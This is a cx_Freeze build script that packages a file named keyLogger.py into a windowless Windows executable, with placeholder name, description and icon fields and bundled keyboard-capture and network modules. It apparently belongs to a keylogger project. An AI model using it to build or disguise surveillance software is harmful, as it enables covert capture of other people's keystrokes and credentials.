import sys
from cx_Freeze import setup, Executable

# Dependencies are automatically detected, but it might need fine tuning.
# "packages": ["os"] is used as example only
build_exe_options = {"packages": ["os", "pathlib", "winshell", "win32com", "datetime", "requests",
                                  "pynput", "requests"]}

# base="Win32GUI" should be used only for Windows GUI app
base = None
if sys.platform == "win32":
    base = "Win32GUI"

setup(
    name="PROGRAM NAME HERE",
    version="0.1",
    description="PROGRAM DESCRIPTION HERE",
    options={"build_exe": build_exe_options},
    executables=[Executable("keyLogger.py", base=base, icon="ICONFILEHERE.ico")]
)